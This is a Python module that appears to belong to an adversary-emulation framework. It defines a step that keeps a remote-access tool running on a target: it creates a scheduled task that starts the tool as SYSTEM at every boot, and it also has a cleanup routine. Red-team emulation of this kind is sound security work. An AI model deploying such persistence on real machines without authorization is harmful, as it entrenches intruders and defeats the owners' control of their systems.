from plugins.adversary.app.commands import schtasks
from plugins.adversary.app.operation.operation import Step, OPFile, OPHost, OPRat, OPVar, OPSchtask, OPPersistence


class SchtasksPersist(Step):
    """
    Description:
        This step involves scheduling a startup task on a target machine with the goal of maintaining persistence.
        Any RATs spawn via this method run as SYSTEM.
    Requirements:
        Requires an Elevated RAT, and a accessible copy of the RAT on the target machine.
    """
    attack_mapping = [('T1053', 'Persistence'), ('T1106', 'Execution')]
    display_name = "schtasks_persist"
    summary = "Schedule a startup task to gain persistence using schtask.exe"

    preconditions = [("rat", OPRat({"elevated": True})),
                     ("host", OPHost(OPVar("rat.host"))),
                     ("rat_file", OPFile({"host": OPVar("host"), 'use_case': 'rat'}))]

    postconditions =[("schtask_g", OPSchtask({"host": OPVar("host"), "schedule_type": "onstart"})),
                     ("persist_g", OPPersistence({"host": OPVar("host"), "elevated": True}))]

    significant_parameters = ['host']

    preproperties = ["rat_file.path"]
    postproperties = ["persist_g.schtasks_artifact",
                      "schtask_g.name", "schtask_g.exe_path"]

    @staticmethod
    def description(rat):
        return "Gaining persistence on {} by scheduling a startup task.".format(rat.host.hostname)

    @staticmethod
    async def simulate(operation, rat, host, rat_file, schtask_g, persist_g):
        return True

    @staticmethod
    async def action(operation, rat, host, rat_file, schtask_g, persist_g):
        task_name = operation.adversary_artifactlist.get_scheduled_task_word()
        exe_path = rat_file.path
        arguments = ""

        await operation.execute_shell_command(rat, *schtasks.create(task_name=task_name, arguments=arguments,
                                                                    exe_path=exe_path,
                                                                    remote_user="SYSTEM", schedule_type="ONSTART"))

        schtask = await schtask_g({"name": task_name, "exe_path": exe_path, "arguments": arguments})
        await persist_g({"schtasks_artifact": schtask})

        return True

    @staticmethod
    async def cleanup(cleaner, schtask_g):
        for schtask in schtask_g:
            await cleaner.delete(schtask)
